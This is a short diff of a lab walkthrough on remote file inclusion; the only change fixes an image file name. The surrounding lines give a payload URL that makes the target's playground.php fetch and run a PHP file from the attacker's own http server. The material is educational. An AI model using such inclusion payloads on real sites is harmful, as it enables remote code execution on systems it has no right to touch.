@@ -113,7 +113,7 @@ We now have running a http.server in our directoy which will allow us to downloa
 Navigate back to the playground webpage and enter the following into the address bar  
 ```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:8080/test.php```  
 If done correctly we will be able to see a **GET** requested recived in our terminal with the running http server as below.
-![lab4_pull_request](./Images/lab4_pull_request.png)
+![lab4_pull_request](./Images/lab4_pull_requests.png)
 
 And we can also confirm the test on the website where we can see the output contents of our file.
 ![lab4_web_result](./Images/lab4_web_result.png)  
